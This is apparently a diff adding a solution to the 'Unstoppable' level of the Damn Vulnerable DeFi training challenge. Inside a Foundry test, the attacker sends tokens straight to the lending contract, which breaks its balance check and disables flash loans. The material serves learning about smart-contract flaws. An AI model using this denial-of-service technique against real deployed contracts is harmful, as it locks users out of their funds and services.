@@ -60,6 +60,14 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+         vm.startPrank(attacker);
+        // transfer token to DamnValuableToken, will increase balance of Token
+        // let poolBalance != balanceBefore, then disable flashLoan
+        dvt.transfer(
+            address(unstoppableLender),
+            INITIAL_ATTACKER_TOKEN_BALANCE
+        );
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
